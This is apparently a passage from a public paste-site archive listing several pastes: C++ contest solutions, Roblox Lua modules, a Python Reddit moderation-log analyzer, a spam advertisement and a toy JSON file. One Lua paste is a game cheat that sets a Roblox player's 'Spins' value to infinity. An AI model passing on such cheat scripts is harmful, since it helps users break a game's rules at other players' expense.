                if (cnt[i] >= 0) { ifmore[i] = 0; }
                if (cnt[i] <= 0) { ifless[i] = 0; }
            }
        }
		// точно также, но для случая с противоположным знаком просто меняются и знаки сравнения с нулем
    }
    int ans = 0;
	// ищем ответ. Если у нас есть несколько вариантов того, что кто-то может весить больше остальных (или меньше), то ответ сразу 0, так как мы по итогу не сможем отличить эти варианты. Если же какой-то человек одновременно может весить и больше, и меньше, то это ок, ведь его могли просто ни разу не брать, а все остальные были равны.
    for (int i = 0; i < n; ++i) {
        if (ifless[i]) {
            if (ans == 0) ans = i + 1;
            else {
                cout << ""0\n"";
                return;
            }
        }
        if (ifmore[i]) {
            if (ans == 0 || ans == i + 1) ans = i + 1;
            else {
                cout << ""0\n"";
                return;
            }
        }
    }
    cout << ans << endl;
}

int main() {
  ios::sync_with_stdio(false);
  cin.tie(nullptr);

  solve();
}
"
SVREc42D,Untitled,Josif_tepe,C++,Wednesday 23rd of July 2025 10:58:36 AM CDT,"#include <iostream>
#include <cstring>
using namespace std;
typedef long long ll;
const int maxn = 200001;
const ll MOD = 1e9 + 7;
int n;
string s;
ll dp[maxn][8];

ll rec(int at, int remainder) {
    if(at == n and remainder == 0) {
        return 1;
    }
    
    if(at == n) {
        return 0;
    }
    
    if(dp[at][remainder] != -1) {
        return dp[at][remainder];
    }
    ll res = 0;
    res += rec(at + 1, remainder);
    res %= MOD;
    
    int new_remainder = (remainder * 10 + (s[at] - '0')) % 8;
    res += rec(at + 1, new_remainder);
    res %= MOD;
    
    dp[at][remainder] = res;
    return res;
}
int main() {
    cin >> n;
    cin >> s;
    
    memset(dp, -1, sizeof dp);
    cout << rec(0, 0) - 1 << endl;
    return 0;
}
"
8kfzktyn,Untitled,Josif_tepe,C++,Wednesday 23rd of July 2025 09:50:03 AM CDT,"#include <iostream>
#include <cstring>
using namespace std;
int t,n,k,s;
const int maxs=1001;
int x[maxs];
int dp[maxs][maxs][11];
int rec(int at,int movesleft,int pos){
 if(at==s){
    return 0;
 }
 int res=0;
    if(at != -1 and dp[at][movesleft][pos] != -1) {
        return dp[at][movesleft][pos];
    }
 if(at != -1 and pos==x[at]){
    res=max(res,rec(at+1,movesleft,pos)+1);
    if(movesleft>0){
        if(pos>0){
           res=max(res,rec(at+1,movesleft-1,pos-1)+1);
        }
        if(pos<n){
           res=max(res,rec(at+1,movesleft-1,pos+1)+1);
        }
    }
 }
    
    if(movesleft>0){
        if(pos>0){
           res=max(res,rec(at+1,movesleft-1,pos-1));
        }
        if(pos<n){
           res=max(res,rec(at+1,movesleft-1,pos+1));
        }
    
 }
    res=max(res,rec(at+1,movesleft,pos));
    if(at != -1) {
        dp[at][movesleft][pos] = res;
    }
    return res;
}
 
int main()
{
    cin>>t;
    for(int i = 0;i<t;i++){
        memset(dp, -1, sizeof dp);
        cin>>n>>k>>s;
        for(int j = 0;j<s;j++){
          cin>>x[j];
            x[j]--;
        }
        int rez=rec(-1,k, 0);
        cout<<rez<<endl;
    }
 
    return 0;
}
"
SkBHWwau,Ball Battles script (inf spins),Nythic,Lua,Wednesday 23rd of July 2025 09:21:07 AM CDT,"-- DISCORD: https://discord.gg/u3V8d45P9Q
 



-- Pobranie lokalnego gracza (czyli Ciebie w grze)
local player = game.Players.LocalPlayer

-- Czekanie na załadowanie się folderu ""otherValues"" i wartości ""Spins""
-- Używamy WaitForChild, aby uniknąć błędów, jeśli skrypt uruchomi się zbyt wcześnie
local spinsValue = player:WaitForChild(""otherValues""):WaitForChild(""Spins"")

-- Sprawdzenie, czy na pewno znaleziono obiekt i jest to NumberValue
if spinsValue and spinsValue:IsA(""NumberValue"") then
    -- Ustawienie wartości na nieskończoność. W Lua jest to reprezentowane przez ""math.huge""
    spinsValue.Value = math.huge
    print(""Ustawiono spiny na nieskończoność!"")
else
    warn(""Nie znaleziono obiektu 'Spins' dla gracza: "" .. player.Name)
end"
YqXn4sQu,Untitled,skytless,C++,Wednesday 23rd of July 2025 08:56:28 AM CDT,"#include <iostream>
#include <vector>

using namespace std;

using ll = long long;

void print(vector<ll> &v) {
    for (int i = 0; i < v.size(); i++) {
        cout << v[i] << ' ';
    }
    cout << endl;
}

int main() {
    //ll a[] = {2, 7, 11, 12, 18};
    //ll a[3][10];
    
    vector<ll> a;
    vector<ll> b(10);
    vector<ll> c(5);
    for (int i = 0; i < c.size(); i++) {
        c[i] = i + 1;
    }
    
    //print(a);
    //print(b);
    //print(c);
    
    c.push_back(5);
    c.erase(c.begin() + 3);
    c.insert(c.begin() + 3, 10);
    c.pop_back();
    //print(c);
    
    for (auto &x: c) {
        x++;
        cout << x << ' ';
    }
    cout << endl;
    for (auto x: c) {
        cout << x << ' ';
    }
    
    
    //vector<vector<ll>> b(3, vector<ll>(10));
 
    /*
    double d = 3.17;
    cout << d;
    */
    
    
    /*
    char c;
	c = 'D';
	//'a' -> 97, 'b' -> 98
	//'0' -> 48
	//'1' -> 49
	cout << '8' - '0';
	string s = ""abcde0"";
	for (int i = 0; i < s.size(); i++) {
	    cout << s[i] << ' ';
	}
	
	char c = '3';
    cout << int(c);
    cout << char(120);
	*/
    
    
    /*
	ll a = 2e9, b = 2e9;
	ll c;
	c = (ll)a + b;
	cout << a << ' ' << b << endl;
	cout << c;
	*/
	
	
}
"
UnkkFB3z,TDS全部地圖,chen399d,Lua,Wednesday 23rd of July 2025 08:36:52 AM CDT,"TDSMaps = {
    Version = ""0.0"",Author = ""Tseting-nil"",
	Regular = {
		AbandonedCity = { name = ""Abandoned City"", Script = """" },
		AutumnFalling = { name = ""Autumn Falling"", Script = """" },
		Crossroads = { name = ""Crossroads"", Script = """" },
		ForestCamp = { name = ""Forest Camp"", Script = """" },
		FungiIsland = { name = ""Fungi Island"", Script = """" },
		GrassIsle = { name = ""Grass Isle"", Script = """" },
		Harbor = { name = ""Harbor"", Script = """" },
		Necropolis = { name = ""Necropolis"", Script = """" },
		Portland = { name = ""Portland"", Script = """" },
		RetroCrossroads = { name = ""Retro Crossroads"", Script = """" },
		RetroStainedTemple = { name = ""Retro Stained Temple"", Script = """" },
		RocketArena = { name = ""Rocket Arena"", Script = """" },
		SkyIslands = { name = ""Sky Islands"", Script = """" },
		TropicalIsles = { name = ""Tropical Isles"", Script = """" },
		Toyboard = { name = ""Toyboard"", Script = """" },
		UTurn = { name = ""U-Turn"", Script = """" },
		ChessBoard = { name = ""Chess Board"", Script = """" },
		CoralDeep = { name = ""Coral Deep"", Script = """" },
		CrystalCave = { name = ""Crystal Cave"", Script = """" },
		CyberCity = { name = ""Cyber City"", Script = """" },
		DesertedVillage = { name = ""Deserted Village"", Script = """" },
		FarmLands = { name = ""Farm Lands"", Script = """" },
		FourSeasons = { name = ""Four Seasons"", Script = """" },
		Lighthaos = { name = ""Lighthaos"", Script = """" },
		Marshlands = { name = ""Marshlands"", Script = """" },
		MedievalTimes = { name = ""Medieval Times"", Script = """" },
		Meltdown = { name = ""Meltdown"", Script = """" },
		MoonBase = { name = ""Moon Base"", Script = """" },
		Nether = { name = ""Nether"", Script = """" },
		NightStation = { name = ""Night Station"", Script = """" },
		RetroLighthouse = { name = ""Retro Lighthouse"", Script = """" },
		RubyEscort = { name = ""Ruby Escort"", Script = """" },
		Simplicity = { name = ""Simplicity"", Script = """" },
		SpringFever = { name = ""Spring Fever"", Script = """" },
		StainedTemple = { name = ""Stained Temple"", Script = """" },
		SugarRush = { name = ""Sugar Rush"", Script = """" },
		SummerCastle = { name = ""Summer Castle"", Script = """" },
		TropicalIndustries = { name = ""Tropical Industries"", Script = """" },
		WinterBridges = { name = ""Winter Bridges"", Script = """" },
		WreckedBattlefield = { name = ""Wrecked Battlefield"", Script = """" },
		WreckedBattlefieldII = { name = ""Wrecked Battlefield II"", Script = """" },
		AbyssalTrench = { name = ""Abyssal Trench"", Script = """" },
		CandyValley = { name = ""Candy Valley"", Script = """" },
		Cataclysm = { name = ""Cataclysm"", Script = """" },
		ConstructionCrazy = { name = ""Construction Crazy"", Script = """" },
		DustyBridges = { name = ""Dusty Bridges"", Script = """" },
		ForgettenDocks = { name = ""Forgetten Docks"", Script = """" },
		GildedPath = { name = ""Gilded Path"", Script = """" },
		RetroTheHeights = { name = ""Retro The Heights"", Script = """" },
		RetroZone = { name = ""Retro Zone"", Script = """" },
		SacredMountains = { name = ""Sacred Mountains"", Script = """" },
		TheHeights = { name = ""The Heights"", Script = """" },
		WinterAbyss = { name = ""Winter Abyss"", Script = """" },
		BlackSpotExchange = { name = ""Black Spot Exchange"", Script = """" },
		DeadAhead = { name = ""Dead Ahead"", Script = """" },
		HotSpot = { name = ""Hot Spot"", Script = """" },
		InfernalAbyss = { name = ""Infernal Abyss"", Script = """" },
		LayBy = { name = ""Lay By"", Script = """" },
		MasonArch = { name = ""Mason Arch"", Script = """" },
		SpaceCity = { name = ""Space City"", Script = """" },
		WinterStronghold = { name = ""Winter Stronghold"", Script = """" }
	},
	Special = {
		BadlandsII = { name = ""Badlands II"", Script = """" },
		PizzaParty = { name = ""Pizza Party"", Script = """" },
		PollutedWastelandII = { name = ""Polluted Wasteland II"", Script = """" }
	},
	Hardcore = {
		AutumnFalling = { name = ""Autumn Falling"", script = """" },
		Crossroads = { name = ""Crossroads"", script = """" },
		Harbor = { name = ""Harbor"", script = """" },
		CyberCity = { name = ""Cyber City"", script = """" },
		FourSeasons = { name = ""Four Seasons"", script = """" },
		Marshlands = { name = ""Marshlands"", script = """" },
		MedievalTimes = { name = ""Medieval Times"", script = """" },
		Nether = { name = ""Nether"", script = """" },
		NightStation = { name = ""Night Station"", script = """" },
		WreckedBattlefield = { name = ""Wrecked Battlefield"", script = """" },
		WreckedBattlefieldII = { name = ""Wrecked Battlefield II"", script = """" },
		BlackSpotExchange = { name = ""Black Spot Exchange"", script = """" },
		HotSpot = { name = ""Hot Spot"", script = """" },
		InfernalAbyss = { name = ""Infernal Abyss"", script = """" },
		LegacySpaceCity = { name = ""Legacy Space City"", script = """" },
		SpaceCity = { name = ""Space City"", script = """" },
		UnknownGarden = { name = ""Unknown Garden"", script = """" }
	}
}

return TDSMaps
"
smvuLfqd,Automod ana,genericPaster,Python,Wednesday 23rd of July 2025 08:28:49 AM CDT,"#!/usr/bin/env python3
""""""
    Moderation Log Analyzer
    
    Analyzes Reddit moderation logs to track automod effectiveness
    and identify when human moderators are undoing automod actions.
""""""

import json
import re
from datetime import datetime
from collections import defaultdict, Counter
from dataclasses import dataclass
from typing import List, Dict, Tuple, Optional

@dataclass
class ModAction:
    """"""    Represents a single moderation action from the log.
    
    """"""
    time: str
    moderator: str
    action_type: str
    action: str
    content: str
    username: str
    parsed_time: datetime

class ModerationAnalyzer:
    """"""    Analyzes moderation logs to track automod effectiveness and
           human moderator interventions.
    
    """"""
    
    def __init__(self, json_file_path: str):
        """"""        Initialize analyzer with moderation log data.
        
        Args:
            json_file_path: Path to the JSON moderation log file
        """"""
        self.actions = []
        self.load_data(json_file_path)
    
    def load_data(self, json_file_path: str) -> None:
        """"""        Load and parse moderation log data from JSON file.
        
        """"""
        with open(json_file_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
        
        for entry in data.get('JSONdata', []):
            action = self.parse_action(entry)
            if action:
                self.actions.append(action)
        
        # Sort by time for chronological analysis
        self.actions.sort(key=lambda x: x.parsed_time)
    
    def parse_action(self, entry: Dict) -> Optional[ModAction]:
        """"""        Parse a single log entry into a ModAction object.
        
        Extracts username from content using multiple patterns to handle
        various formats in the mod log.
        """"""
        try:
            content = entry.get('Content', '')
            
            # Extract username using multiple patterns
            username = self.extract_username(content)
            if username == 'unknown':
                return None
            
            # Parse time
            time_str = entry.get('Time', '')
            parsed_time = self.parse_time(time_str)
            
            return ModAction(
                time=time_str,
                moderator=entry.get('Moderator', ''),
                action_type=entry.get('Type', ''),
                action=entry.get('Action', ''),
                content=content,
                username=username,
                parsed_time=parsed_time
            )
        except Exception as e:
            print(f""Error parsing entry: {e}"")
            return None
    
    def extract_username(self, content: str) -> str:
        """"""        Extract username from content using various patterns.
        
        Handles different formats and edge cases like system actions
        and bot-generated content.
        """"""
        # Handle empty or very short content
        if not content or len(content.strip()) < 3:
            return 'system'
        
        # Try different username patterns
        patterns = [
            r'^u/(\S+)'  # Captures non-whitespace characters after u/
        ]
        for pattern in patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                username = match.group(1)
                username = username.rstrip('.,!?:;')
                if len(username) >= 2:
                    return username
        return 'unknown'
    
    def parse_time(self, time_str: str) -> datetime:
        """"""        Parse time string into datetime object.
        
        """"""
        try:
            return datetime.strptime(time_str, '%I:%M %p %b %d, %Y')
        except:
            try:
                return datetime.strptime(time_str, '%H:%M %p %b %d, %Y')
            except:
                return datetime.now()  # Fallback
    
    def identify_undos(self) -> List[Tuple[ModAction, ModAction]]:

        undos = []
        
        # Group all actions by username only
        user_actions = defaultdict(list)
        for action in self.actions:
            user_actions[action.username].append(action)
        
        # Look for AutoMod → Human undo patterns for each user
        for username, actions in user_actions.items():
            # Sort actions by time for this user
            actions.sort(key=lambda x: x.parsed_time)
            
            # Find all AutoMod → Human action pairs
            for i, automod_action in enumerate(actions):
                if 'AutoModerator' not in automod_action.moderator:
                    continue
                    
                # Look for subsequent human actions on same user
                for j in range(i + 1, len(actions)):
                    human_action = actions[j]
                    
                    # Skip if it's another AutoMod action
                    if 'AutoModerator' in human_action.moderator:
                        continue
                    
                    # Check if this human action undoes the AutoMod action
                    if self.is_undo_pair(automod_action, human_action):
                        undos.append((automod_action, human_action))
                        break  # Only match first undo for this AutoMod action
        
        return undos
    
    def is_undo_pair(self, action1: ModAction, action2: ModAction) -> bool:
        """"""        Determine if two actions constitute an undo pair.
        
        For username-based correlation, we look for:
        - AutoMod removes/spams → Human approves/unspams
        - Any opposing moderation actions on the same user
        """"""
        # Define opposing action patterns
        removal_actions = ['Remove', 'Spam']
        approval_actions = ['Approve', 'Unspam']
        
        action1_is_removal = any(word in action1.action for word in removal_actions)
        action1_is_approval = any(word in action1.action for word in approval_actions)
        
        action2_is_removal = any(word in action2.action for word in removal_actions)
        action2_is_approval = any(word in action2.action for word in approval_actions)
        
        # Check if action2 undoes action1
        if action1_is_removal and action2_is_approval:
            return True
        
        # Also check reverse case (though less common in AutoMod context)
        if action1_is_approval and action2_is_removal:
            return True
        
        return False
    
    def generate_summary_report(self) -> str:
        """"""        Generate comprehensive summary report of moderation activity.
        
        """"""
        report = []
        report.append(""="" * 60)
        report.append(""MODERATION LOG ANALYSIS SUMMARY"")
        report.append(""="" * 60)
        
        # Basic statistics
        total_actions = len(self.actions)
        automod_actions = len([a for a in self.actions if 'AutoModerator' in a.moderator])
        human_actions = total_actions - automod_actions
        
        report.append(f""\nBASIC STATISTICS:"")
        report.append(f""Total Actions: {total_actions}"")
        report.append(f""AutoModerator Actions: {automod_actions} ({automod_actions/total_actions*100:.1f}%)"")
        report.append(f""Human Moderator Actions: {human_actions} ({human_actions/total_actions*100:.1f}%)"")
        
        # Action type breakdown
        action_counts = Counter(action.action for action in self.actions)
        report.append(f""\nACTION BREAKDOWN:"")
        for action, count in action_counts.most_common():
            report.append(f""  {action}: {count}"")
        
        # Moderator activity
        mod_counts = Counter(action.moderator for action in self.actions)
        report.append(f""\nMODERATOR ACTIVITY:"")
        for mod, count in mod_counts.most_common():
            report.append(f""  {mod}: {count}"")
        
        # Undo analysis
        undos = self.identify_undos()
        report.append(f""\nUNDO ANALYSIS:"")
        report.append(f""Total Undo Actions Found: {len(undos)}"")
        
        if undos:
            # Categorize undos
            automod_undone = [u for u in undos if 'AutoModerator' in u[0].moderator]
            human_undone = [u for u in undos if 'AutoModerator' not in u[0].moderator]
            
            report.append(f""AutoModerator Actions Undone by Humans: {len(automod_undone)}"")
            report.append(f""Human Actions Undone: {len(human_undone)}"")
            
            if automod_actions > 0:
                undo_rate = len(automod_undone) / automod_actions * 100
                report.append(f""AutoMod Undo Rate: {undo_rate:.2f}%"")
        
        return ""\n"".join(report)

    def get_undoable_actions(self, actions: List[ModAction]) -> List[ModAction]:
        """"""        Filter actions to only those that could potentially be undone.
        
        Only removal/spam actions can be undone by approval/unspam actions.
        """"""
        removal_actions = ['Remove', 'Spam']
        return [action for action in actions 
                if any(word in action.action for word in removal_actions)]
    
    def generate_effectiveness_report(self) -> str:
        """"""        Generate report on automod effectiveness for the experiment.
        
        Separates analysis by content type (Comments vs Posts/Other).
        Only counts undoable actions in effectiveness calculations.
        """"""
        undos = self.identify_undos()
        all_automod_actions = [a for a in self.actions if 'AutoModerator' in a.moderator]
        
        # Only count actions that could potentially be undone
        automod_actions = self.get_undoable_actions(all_automod_actions)
        automod_undone = [u for u in undos if 'AutoModerator' in u[0].moderator]
        
        report = []
        report.append(""="" * 60)
        report.append(""AUTOMOD EFFECTIVENESS ANALYSIS"")
        report.append(""="" * 60)
        
        if not automod_actions:
            if all_automod_actions:
                report.append(""AutoModerator performed actions, but none were undoable removal/spam actions."")
                report.append(f""Total AutoMod actions: {len(all_automod_actions)} (sticky, distinguish, etc.)"")
            else:
                report.append(""No AutoModerator actions found in log."")
            return ""\n"".join(report)
        
        # Show both totals for transparency
        report.append(f""AutoMod total actions: {len(all_automod_actions)}"")
        report.append(f""AutoMod undoable actions (Remove/Spam): {len(automod_actions)}"")
        
        # Separate actions by content type
        comment_actions = [a for a in automod_actions if a.action_type == 'Comments']
        post_actions = [a for a in automod_actions if a.action_type != 'Comments']
        
        comment_undone = [u for u in automod_undone if u[0].action_type == 'Comments']
        post_undone = [u for u in automod_undone if u[0].action_type != 'Comments']
        
        # Overall effectiveness (only for undoable actions)
        total_automod = len(automod_actions)
        undone_count = len(automod_undone)
        effectiveness = ((total_automod - undone_count) / total_automod) * 100 if total_automod > 0 else 0
        
        report.append(f""\nOVERALL EFFECTIVENESS (Undoable Actions Only):"")
        report.append(f""Total AutoMod Undoable Actions: {total_automod}"")
        report.append(f""Actions Undone by Humans: {undone_count}"")
        report.append(f""Effectiveness Rate: {effectiveness:.1f}%"")
        report.append(f""Undo Rate: {(undone_count/total_automod)*100:.1f}%"")
        
        # Comments-specific analysis
        if comment_actions:
            comment_total = len(comment_actions)
            comment_undone_count = len(comment_undone)
            comment_effectiveness = ((comment_total - comment_undone_count) / comment_total) * 100
            
            report.append(f""\nCOMMENT MODERATION EFFECTIVENESS:"")
            report.append(f""Total AutoMod Comment Actions: {comment_total}"")
            report.append(f""Comment Actions Undone: {comment_undone_count}"")
            report.append(f""Comment Effectiveness Rate: {comment_effectiveness:.1f}%"")
            report.append(f""Comment Undo Rate: {(comment_undone_count/comment_total)*100:.1f}%"")
            
            # Break down comment actions by type
            comment_by_action = defaultdict(int)
            comment_undos_by_action = defaultdict(int)
            
            for action in comment_actions:
                comment_by_action[action.action] += 1
            
            for original, _ in comment_undone:
                comment_undos_by_action[original.action] += 1
            
            if comment_by_action:
                report.append(f""\n  Comment Actions Breakdown:"")
                for action_type in comment_by_action:
                    total = comment_by_action[action_type]
                    undone = comment_undos_by_action[action_type]
                    rate = ((total - undone) / total) * 100 if total > 0 else 0
                    
                    report.append(f""    {action_type}:"")
                    report.append(f""      Total: {total}, Undone: {undone}, Effectiveness: {rate:.1f}%"")
        
        # Posts-specific analysis  
        if post_actions:
            post_total = len(post_actions)
            post_undone_count = len(post_undone)
            post_effectiveness = ((post_total - post_undone_count) / post_total) * 100
            
            report.append(f""\nPOST MODERATION EFFECTIVENESS:"")
            report.append(f""Total AutoMod Post Actions: {post_total}"")
            report.append(f""Post Actions Undone: {post_undone_count}"")
            report.append(f""Post Effectiveness Rate: {post_effectiveness:.1f}%"")
            report.append(f""Post Undo Rate: {(post_undone_count/post_total)*100:.1f}%"")
            
            # Break down post actions by type
            post_by_action = defaultdict(int)
            post_undos_by_action = defaultdict(int)
            
            for action in post_actions:
                post_by_action[action.action] += 1
            
            for original, _ in post_undone:
                post_undos_by_action[original.action] += 1
            
            if post_by_action:
                report.append(f""\n  Post Actions Breakdown:"")
                for action_type in post_by_action:
                    total = post_by_action[action_type]
                    undone = post_undos_by_action[action_type]
                    rate = ((total - undone) / total) * 100 if total > 0 else 0
                    
                    report.append(f""    {action_type}:"")
                    report.append(f""      Total: {total}, Undone: {undone}, Effectiveness: {rate:.1f}%"")
               
        return ""\n"".join(report)

def main():
    """"""    Main function to run the analysis.
    
    """"""
    import sys
    
    if len(sys.argv) != 2:
        print(""Usage: python mod_analyzer.py <json_file>"")
        sys.exit(1)
    
    json_file = sys.argv[1]
    
    try:
        analyzer = ModerationAnalyzer(json_file)
        
        print(analyzer.generate_summary_report())
        print(""\n\n"")
        print(analyzer.generate_effectiveness_report())
        print(""\n\n"")
        
    except FileNotFoundError:
        print(f""Error: File '{json_file}' not found."")
    except json.JSONDecodeError:
        print(f""Error: Invalid JSON in file '{json_file}'."")
    except Exception as e:
        print(f""Error analyzing file: {e}"")

if __name__ == ""__main__"":
    main()"
Kdz2tctU,Software Development Company in India,prologictechnologies,CSS,Wednesday 23rd of July 2025 07:39:02 AM CDT,"Prologic Technologies is a trusted software development company in India, specializing in delivering innovative, scalable, and high-performance digital solutions tailored to your business needs. With expertise in AI-powered applications, web and mobile development, custom enterprise software, and digital transformation services, we empower startups, SMBs, and global enterprises to succeed in the modern tech landscape. Our team of experienced developers, UI/UX designers, and solution architects work collaboratively to ensure every project is delivered with precision, agility, and a client-first approach. Partner with Prologic Technologies to turn your ideas into powerful software solutions.

https://www.prologic-technologies.com/"
H4Akvfp9,Untitled,Kubig,JSON,Wednesday 23rd of July 2025 07:38:47 AM CDT,"[
    {
        ""id"": 1,
        ""username"": ""SHOOL"",
        ""password"": ""123456"",
        ""tasks"": [
            {
                ""id"": 1,
                ""title"": ""500 отжиманий"",
                ""description"": ""Сделать 500 отджиманий в день"",
                ""status"": ""Incompleted"",
                ""user"": {
                    ""id"": 1,
                    ""username"": ""SHOOL"",
                    ""password"": ""123456"",
                    ""tasks"": [
                        {
                            ""id"": 1,
                            ""title"": ""500 отжиманий"",
                            ""description"": ""Сделать 500 отджиманий в день"",
                            ""status"": ""Incompleted"",
                            ""user"": {
                                ""id"": 1,
                                ""username"": ""SHOOL"",
                                ""password"": ""123456"",
                                ""tasks"": [
                                    {"
kquH3NmW,巡路模組,chen399d,Lua,Wednesday 23rd of July 2025 07:37:58 AM CDT,"-- Module: TDS_PathfindingModule
local PathfindingService = game:GetService(""PathfindingService"")
local Players = game:GetService(""Players"")
local Workspace = game:GetService(""Workspace"")
local Debris = game:GetService(""Debris"")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild(""Humanoid"")
local rootPart = character:WaitForChild(""HumanoidRootPart"")

-- === 模組表 ===
local TDS = {}

-- === 參數設定 ===
local MAX_RETRIES = 3
local PATHFINDING_TIMEOUT = 5
local PATH_VISUALIZATION_DURATION = 30
local MAX_DEVIATION = 10 -- 偏離距離

-- === 路徑顏色策略 ===
local PATH_COLORS = {
    [1] = { point = BrickColor.new(""Bright red""), connection = BrickColor.new(""Really red"") },
    [2] = { point = BrickColor.new(""Bright green""), connection = BrickColor.new(""Earth green"") },
    [3] = { point = BrickColor.new(""Bright blue""), connection = BrickColor.new(""Really blue"") }
}

local isNavigating = false
local pathParts = {}
local attemptColor = 1

-- === 清除之前路徑顯示 ===
local function clearPathVisualization()
    for _, part in pairs(pathParts) do
        if part and part.Parent then part:Destroy() end
    end
    pathParts = {}
end

-- === 可視化路徑 ===
local function visualizePath(waypoints, colorSet)
    clearPathVisualization()
    for i, waypoint in ipairs(waypoints) do
        local pathPart = Instance.new(""Part"")
        pathPart.Name = ""PathPoint_"" .. i
        pathPart.Anchored = true
        pathPart.CanCollide = false
        pathPart.Material = Enum.Material.Neon
        pathPart.BrickColor = colorSet.point
        pathPart.Size = Vector3.new(1, 0.2, 1)
        pathPart.Position = waypoint.Position
        pathPart.Parent = Workspace

        local light = Instance.new(""PointLight"")
        light.Brightness = 2
        light.Range = 5
        light.Color = colorSet.point.Color
        light.Parent = pathPart

        if i > 1 then
            local prev = waypoints[i-1]
            local distance = (waypoint.Position - prev.Position).Magnitude
            local connection = Instance.new(""Part"")
            connection.Name = ""PathConnection_"" .. (i-1) .. ""_to_"" .. i
            connection.Anchored = true
            connection.CanCollide = false
            connection.Material = Enum.Material.ForceField
            connection.BrickColor = colorSet.connection
            connection.Size = Vector3.new(0.2, 0.2, distance)
            connection.CFrame = CFrame.lookAt((waypoint.Position + prev.Position) / 2, waypoint.Position)
            connection.Parent = Workspace
            table.insert(pathParts, connection)
        end
        table.insert(pathParts, pathPart)
    end
    for _, part in pairs(pathParts) do
        Debris:AddItem(part, PATH_VISUALIZATION_DURATION)
    end
end

-- === 將目標調整到地面 ===
local function snapToGround(position)
    local params = RaycastParams.new()
    params.FilterType = Enum.RaycastFilterType.Exclude
    params.FilterDescendantsInstances = {character}

    local result = Workspace:Raycast(position + Vector3.new(0, 50, 0), Vector3.new(0, -100, 0), params)
    if result then
        return result.Position + Vector3.new(0, humanoid.HipHeight + 0.5, 0)
    end
    return nil
end

-- === 偏移檢測 ===
local function monitorDeviation(expectedPos)
    local currentPos = rootPart.Position
    return (currentPos - expectedPos).Magnitude <= MAX_DEVIATION
end

-- === 三階段策略尋路 ===
local function tryPathfindingWithStrategies(target)
    for attempt = 1, 3 do
        attemptColor = attempt
        local path = PathfindingService:CreatePath({
            AgentHeight = 5,
            AgentRadius = 2,
            AgentCanJump = true,
            WaypointSpacing = (attempt == 1 and 4) or (attempt == 2 and 2) or 1
        })
        local success, err = pcall(function()
            path:ComputeAsync(rootPart.Position, target)
        end)
        if success and path.Status == Enum.PathStatus.Success then
            print(""✅ 成功找到路徑（策略："" .. attempt .. ""）"")
            return path
        else
            warn(""❌ 策略 "" .. attempt .. "" 失敗："" .. (err or path.Status.Name))
        end
    end
    return nil
end

-- === 移動到單一路徑點 ===
local function moveToWaypoint(waypoint, index, total)
    local start = tick()
    humanoid:MoveTo(waypoint.Position)
    local done = false
    local connection
    connection = humanoid.MoveToFinished:Connect(function()
        done = true
        connection:Disconnect()
    end)
    while not done and tick() - start < PATHFINDING_TIMEOUT do
        wait(0.1)
    end
    if connection then connection:Disconnect() end
    return done
end

-- === 核心導航函數 ===
local function navigateTo(targetPos)
    if isNavigating then return false end
    isNavigating = true
    local adjustedTarget = snapToGround(targetPos)
    if not adjustedTarget then
        warn(""❌ 無法找到地面"")
        isNavigating = false
        return false
    end

    local path = tryPathfindingWithStrategies(adjustedTarget)
    if not path then
        warn(""❌ 所有策略失敗"")
        isNavigating = false
        return false
    end

    local waypoints = path:GetWaypoints()
    if #waypoints == 0 then
        warn(""❌ 路徑點為空"")
        isNavigating = false
        return false
    end

    visualizePath(waypoints, PATH_COLORS[attemptColor])

    for i, wp in ipairs(waypoints) do
        if not isNavigating then return false end

        -- 偏移檢測
        if not monitorDeviation(wp.Position) then
            warn(""⚠️ 偵測到偏移，重新尋路..."")
            isNavigating = false
            return navigateTo(targetPos)
        end

        -- 移動
        if wp.Action == Enum.PathWaypointAction.Walk then
            if not moveToWaypoint(wp, i, #waypoints) then
                warn(""❌ 無法到達節點，重新尋路..."")
                isNavigating = false
                return navigateTo(targetPos)
            end
        elseif wp.Action == Enum.PathWaypointAction.Jump then
            humanoid.Jump = true
            wait(0.5)
        end

        -- ✅ 走完該節點 → 刪除對應的方塊 & 連線
        local pointName = ""PathPoint_"" .. i
        local connectionName = ""PathConnection_"" .. (i-1) .. ""_to_"" .. i
        for index, part in ipairs(pathParts) do
            if part.Name == pointName or part.Name == connectionName then
                if part and part.Parent then
                    part:Destroy()
                end
                table.remove(pathParts, index)
            end
        end
    end


    print(""🎉 成功抵達目標！"")
    isNavigating = false
    return true
end

-- === 對外 API ===
function TDS:NavigateToPosition(x, y, z)
    spawn(function()
        navigateTo(Vector3.new(x, y, z))
    end)
end

function TDS:NavigateToPlayer(playerName)
    local targetPlayer = Players:FindFirstChild(playerName)
    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild(""HumanoidRootPart"") then
        local pos = targetPlayer.Character.HumanoidRootPart.Position
        self:NavigateToPosition(pos.X, pos.Y, pos.Z)
    else
        warn(""❌ 找不到玩家："" .. playerName)
    end
end

function TDS:StopCurrentNavigation()
    if isNavigating then
        isNavigating = false
        humanoid:MoveTo(rootPart.Position)
        clearPathVisualization()
        print(""⏹️ 導航已停止"")
    else
        print(""ℹ️ 無進行中的導航"")
    end
end
--TDS:NavigateToPosition(7, 129, 151)
return TDS
"
MpHSe6G0,Untitled,wym36,C++,Wednesday 23rd of July 2025 07:28:05 AM CDT,"#include <iostream>
#include <vector>

using namespace std;

int main()
{
	int n, m, q, x, y;
	cin >> n >> m >> q >> x >> y;

	int a[105][105] = {};

	int dx[4] = {0, 1, 0, -1};
	int dy[4] = {1, 0, -1, 0};

	int z = 0;
	for(int i=1; i<=q; i++)
	{
		int t;
		cin >> t;
		if(t == 1)
		{
			x += dx[z];
			y += dy[z];

		}
		if(t == 2)
		{
			z += 1;
			if(z == 4)
			{
				z = 0;
			}
		}

		if(x < 0 || x >= n || y < 0 || y >= m)
		{
			x -= dx[z];
			y -= dy[z];
		}
		else
		{
			a[x][y] = i;
		}
	}

	for(int i=0; i<n; i++)
	{
		for(int j=0; j<m; j++)
			cout << a[i][j] << "" "";
		cout << ""\n"";
	}


    return 0;
}
"
3bZ4kJb3,веб камера,egor230,Python,Wednesday 23rd of July 2025 06:25:08 AM CDT,"import cv2, sys, os, time, warnings, subprocess
from pynput.keyboard import Key, Controller
warnings.filterwarnings('ignore')
# Путь к файлу Haar Cascade (ваш локальный файл)
cascade_path = ""/mnt/807EB5FA7EB5E954/софт/виртуальная машина/linux must have/python_linux/Project/haarcascade_frontalface_default.xml""


def enhance_brightness(frame):
